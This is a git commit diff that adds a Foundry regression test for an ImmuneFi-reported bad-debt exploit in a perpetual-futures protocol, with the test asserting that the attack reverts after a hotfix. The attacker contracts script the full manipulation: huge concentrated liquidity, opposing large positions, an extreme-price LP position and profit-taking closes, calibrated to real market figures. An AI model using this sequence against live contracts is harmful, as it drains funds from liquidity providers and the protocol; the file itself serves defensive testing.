c8407301820bbbb044ca13381f68293c671d24eb
Vinta Chen <vinta.chen@gmail.com>
2023-01-04 12:40:37 +0800

    add regression tests (Attack) for ImmuneFi #14204

--- test/foundry/immunefi/14204.BadDebtAttack.t.sol
+++ test/foundry/immunefi/14204.BadDebtAttack.t.sol
@@ -12,6 +12,45 @@ import "../../../contracts/MarketRegistry.sol";
 import "../../../contracts/Vault.sol";
 import "../../../contracts/test/TestERC20.sol";
 
+library Utils {
+    /// @dev The maximum tick that may be passed to #getSqrtRatioAtTick computed from log base 1.0001 of 2**128
+    int24 public constant MAX_TICK = -MIN_TICK;
+    int24 public constant MIN_TICK = -887272;
+
+    function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160 sqrtPriceX96) {
+        uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));
+        require(absTick <= uint256(int256(MAX_TICK)), "T");
+
+        uint256 ratio = absTick & 0x1 != 0 ? 0xfffcb933bd6fad37aa2d162d1a594001 : 0x100000000000000000000000000000000;
+        if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
+        if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
+        if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
+        if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
+        if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
+        if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
+        if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
+        if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
+        if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
+        if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
+        if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
+        if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
+        if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
+        if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
+        if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
+        if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
+        if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
+        if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
+        if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;
+
+        if (tick > 0) ratio = type(uint256).max / ratio;
+
+        // this divides by 1<<32 rounding up to go from a Q128.128 to a Q128.96.
+        // we then downcast because we know the result always fits within 160 bits due to our tick input constraint
+        // we round up in the division so getTickAtSqrtRatio of the output price is always consistent
+        sqrtPriceX96 = uint160((ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1));
+    }
+}
+
 contract Attacker is Test {
     address public admin;
     ClearingHouse public clearingHouse;
@@ -19,6 +58,15 @@ contract Attacker is Test {
     AccountBalance public accountBalance;
     Vault public vault;
     TestERC20 public usdc;
+
+    LiquidityPosition[] public liquidityPositions;
+
+    struct LiquidityPosition {
+        int24 lower;
+        int24 upper;
+        address baseToken;
+        uint256 liquidity;
+    }
 
     constructor(
         address adminArg,
@@ -45,7 +93,7 @@ contract Attacker is Test {
         vault.deposit(address(usdc), amount);
     }
 
-    function addLiquiditiy(address baseToken, uint256 quoteAmount) public returns (address pool) {
+    function addLiquidity(address baseToken, uint256 quoteAmount) public returns (address pool) {
         pool = marketRegistry.getPool(baseToken);
 
         (, int24 tick, , , , , ) = UniswapV3Pool(pool).slot0();
@@ -53,19 +101,68 @@ contract Attacker is Test {
         int24 closestTick = tick % space;
 
         // below the current price, only need quote
+        int24 lowerTick = tick - closestTick - space - space;
+        int24 upperTick = tick - closestTick - space;
         IClearingHouse.AddLiquidityParams memory params =
             IClearingHouse.AddLiquidityParams({
                 baseToken: baseToken,
-                base: 1 ether,
+                base: 0,
                 quote: quoteAmount,
-                lowerTick: tick - closestTick - space - space,
-                upperTick: tick - closestTick - space,
+                lowerTick: lowerTick,
+                upperTick: upperTick,
                 minBase: 0,
                 minQuote: 0,
                 useTakerBalance: false,
                 deadline: block.timestamp + 1
             });
-        clearingHouse.addLiquidity(params);
+        IClearingHouse.AddLiquidityResponse memory resp = clearingHouse.addLiquidity(params);
+
+        liquidityPositions.push(
+            LiquidityPosition({ lower: lowerTick, upper: upperTick, baseToken: baseToken, liquidity: resp.liquidity })
+        );
+    }
+
+    function removeLiquidity(address baseToken, uint256 index) public {
+        LiquidityPosition memory liquidityPosition = liquidityPositions[liquidityPositions.length - 1];
+        liquidityPositions.pop();
+
+        IClearingHouse.RemoveLiquidityParams memory params =
+            IClearingHouse.RemoveLiquidityParams({
+                baseToken: liquidityPosition.baseToken,
+                lowerTick: liquidityPosition.lower,
+                upperTick: liquidityPosition.upper,
+                liquidity: uint128(liquidityPosition.liquidity),
+                minBase: 0,
+                minQuote: 0,
+                deadline: block.timestamp
+            });
+        clearingHouse.removeLiquidity(params);
+    }
+
+    function unlimitedLP(address baseToken, uint256 amount) public {
+        address pool = marketRegistry.getPool(baseToken);
+
+        int24 space = UniswapV3Pool(pool).tickSpacing();
+        int24 lowerTick = -245760 + space * 999;
+        int24 upperTick = -245760 + space * 1000;
+
+        IClearingHouse.AddLiquidityParams memory params =
+            IClearingHouse.AddLiquidityParams({
+                baseToken: baseToken,
+                base: amount,
+                quote: amount,
+                lowerTick: lowerTick,
+                upperTick: upperTick,
+                minBase: 0,
+                minQuote: 0,
+                useTakerBalance: false,
+                deadline: block.timestamp + 1
+            });
+        IClearingHouse.AddLiquidityResponse memory resp = clearingHouse.addLiquidity(params);
+
+        liquidityPositions.push(
+            LiquidityPosition({ lower: lowerTick, upper: upperTick, baseToken: baseToken, liquidity: resp.liquidity })
+        );
     }
 
     function openShort(address baseToken, uint256 amount) public returns (uint256 baseAmount, uint256 quoteAmount) {
@@ -97,10 +194,29 @@ contract Attacker is Test {
             });
         (baseAmount, quoteAmount) = clearingHouse.openPosition(params);
     }
+
+    function closePosition(address baseToken, uint160 sqrtPriceLimitX96)
+        public
+        returns (uint256 baseAmount, uint256 quoteAmount)
+    {
+        IClearingHouse.ClosePositionParams memory params =
+            IClearingHouse.ClosePositionParams({
+                baseToken: baseToken,
+                oppositeAmountBound: 0,
+                deadline: block.timestamp,
+                sqrtPriceLimitX96: sqrtPriceLimitX96,
+                referralCode: bytes32(0)
+            });
+        (baseAmount, quoteAmount) = clearingHouse.closePosition(params);
+    }
+
+    function withdrawAll() public {
+        vault.withdrawAll(address(usdc));
+    }
 }
 
 contract BadDebtAttackTest is Setup {
-    uint256 public makerPrivateKey = uint256(2);
+    uint256 public makerPrivateKey = uint256(1);
     address public maker = vm.addr(makerPrivateKey);
     uint8 public usdcDecimals;
 
@@ -113,40 +229,41 @@ contract BadDebtAttackTest is Setup {
 
         vm.label(maker, "Maker");
 
+        // use the actual numbers of vONE on block 44985556 as possible
+
         // initial market
-        // TODO: use the real numbers of vONE on block 44985556
-        pool.initialize(792281625142 ether);
+        pool.initialize(9659599668537315424753160997); // $0.014864800618156348
         pool.increaseObservationCardinalityNext(250);
         marketRegistry.addPool(address(baseToken), pool.fee());
-        marketRegistry.setFeeRatio(address(baseToken), 10000);
-        marketRegistry.setInsuranceFundFeeRatio(address(baseToken), 100000);
+        marketRegistry.setFeeRatio(address(baseToken), 1000);
+        marketRegistry.setInsuranceFundFeeRatio(address(baseToken), 200000);
         exchange.setMaxTickCrossedWithinBlock(address(baseToken), 250);
 
         // mock priceFeed
         vm.mockCall(
             _BASE_TOKEN_PRICE_FEED,
             abi.encodeWithSelector(IPriceFeed.getPrice.selector),
-            abi.encode(100 * 1e8)
+            abi.encode(1486480) // $0.01486480
         );
         usdcDecimals = usdc.decimals();
 
         // mint usdc to maker and deposit to vault
-        uint256 makerUsdcAmount = 10000 * 10**usdcDecimals;
+        uint256 makerUsdcAmount = 400000 * 10**usdcDecimals;
         usdc.mint(maker, makerUsdcAmount);
         vm.startPrank(maker);
         usdc.approve(address(vault), makerUsdcAmount);
         vault.deposit(address(usdc), makerUsdcAmount);
         vm.stopPrank();
 
-        // maker add liquidity
+        // maker add liquidity around $400k
         vm.startPrank(maker);
         clearingHouse.addLiquidity(
             IClearingHouse.AddLiquidityParams({
                 baseToken: address(baseToken),
-                base: 200 ether,
-                quote: 20000 ether,
-                lowerTick: -887220,
-                upperTick: 887220,
+                base: 13454603 ether,
+                quote: 200000 ether,
+                lowerTick: -43800, // $0.012528101792108162
+                upperTick: -41820, // $0.015271133775654594
                 minBase: 0,
                 minQuote: 0,
                 useTakerBalance: false,
@@ -155,8 +272,8 @@ contract BadDebtAttackTest is Setup {
         );
         vm.stopPrank();
 
-        // increase settlementTokenBalanceCap
-        clearingHouseConfig.setSettlementTokenBalanceCap(10000000 * 10**usdcDecimals);
+        // increase settlementTokenBalanceCap to 10m
+        clearingHouseConfig.setSettlementTokenBalanceCap(10_000_000 * 10**usdcDecimals);
 
         badDebter = new Attacker(address(this), address(clearingHouse), address(marketRegistry), address(vault));
         exploiter = new Attacker(address(this), address(clearingHouse), address(marketRegistry), address(vault));
@@ -164,14 +281,26 @@ contract BadDebtAttackTest is Setup {
         vm.label(address(exploiter), "Exploiter");
     }
 
-    function testAttack() public {
-        console.log("1. attacker deposits collaterals");
+    // TODO
+    // function testAttackBeforeHotfix_shouldPass() public {
+    //     uint256 initialUsdc = initialUsdcAmount * 2;
+    //     uint256 currentUsdc = TestERC20(usdc).balanceOf(address(exploiter));
+    //     console.log("initialUsdc:", initialUsdc);
+    //     console.log("currentUsdc:", currentUsdc);
+
+    //     bool hasProfit = currentUsdc > initialUsdc;
+    //     assertEq(hasProfit, true);
+    //     console.log("has profit:", currentUsdc - initialUsdc);
+    // }
+
+    function testAttackAfterHotfix_shouldRevert() public {
+        console.log("1. attacker deposit collaterals");
         badDebter.deposit(initialUsdcAmount);
         exploiter.deposit(initialUsdcAmount);
 
         console.log("2. exploiter add a huge concentrated liquidity (below the current price)");
         uint256 hugeAmount = 9 * initialUsdcAmount * 10**12;
-        exploiter.addLiquiditiy(address(baseToken), hugeAmount);
+        exploiter.addLiquidity(address(baseToken), hugeAmount);
 
         console.log("3. exploiter open a huge short position");
         exploiter.openShort(address(baseToken), hugeAmount);
@@ -179,29 +308,29 @@ contract BadDebtAttackTest is Setup {
         console.log("4. badDebter open a huge long position");
         badDebter.openLong(address(baseToken), hugeAmount);
 
-        // console.log("5. exploiter remove the huge concentrated liquidity");
-        // removeLiquidity(vOne, 0);
+        console.log("5. exploiter remove the huge concentrated liquidity");
+        exploiter.removeLiquidity(address(baseToken), 0);
 
-        // console.log("6. badDebter open a LP position at a really low price");
-        // bad.unlimitLp(vOne, 200000 ether);
+        console.log("6. badDebter open a LP position at a really low price");
+        badDebter.unlimitedLP(address(baseToken), 200000 ether);
 
-        // int256 bAVBefore7 = house.getAccountValue(address(bad));
-        // console.log("7. badDebter close position and realize a huge loss");
-        // bad.badSell(vOne, 0);
-        // int256 bPSAfter7 = accountBalance.getTotalPositionSize(address(bad), vOne);
-        // console.logInt(bPSAfter7);
-        // int256 bAVAfter7 = house.getAccountValue(address(bad));
-        // console.logInt(bAVBefore7);
-        // console.logInt(bAVAfter7);
+        console.log("7. badDebter close position and realize a huge loss");
+        vm.expectRevert(bytes("EX_OPLAS"));
+        badDebter.closePosition(address(baseToken), Utils.getSqrtRatioAtTick(Utils.MIN_TICK) + 100);
 
-        // console.log("8. exploiter close position and take the profit");
-        // sellMax(vOne, 0);
-        // int256 bAVAfter8 = house.getAccountValue(address(bad));
-        // console.logInt(bAVAfter8);
+        console.log("8. exploiter close position and take the profit");
+        vm.expectRevert(bytes("EX_OPLAS"));
+        exploiter.closePosition(address(baseToken), Utils.getSqrtRatioAtTick(Utils.MAX_TICK) - 100);
 
-        // vault.withdrawAll(usdc);
-        // uint256 currentUsdc = ERC20(usdc).balanceOf(address(this));
-        // console.log("currentUsdc:", currentUsdc);
-        // console.log("profit:", currentUsdc - initialUsdcAmount * 2);
+        exploiter.withdrawAll();
+
+        uint256 initialUsdc = initialUsdcAmount * 2;
+        uint256 currentUsdc = TestERC20(usdc).balanceOf(address(exploiter));
+        console.log("initialUsdc:", initialUsdc);
+        console.log("currentUsdc:", currentUsdc);
+
+        bool hasProfit = currentUsdc > initialUsdc;
+        assertEq(hasProfit, false);
+        console.log("no profit");
     }
 }
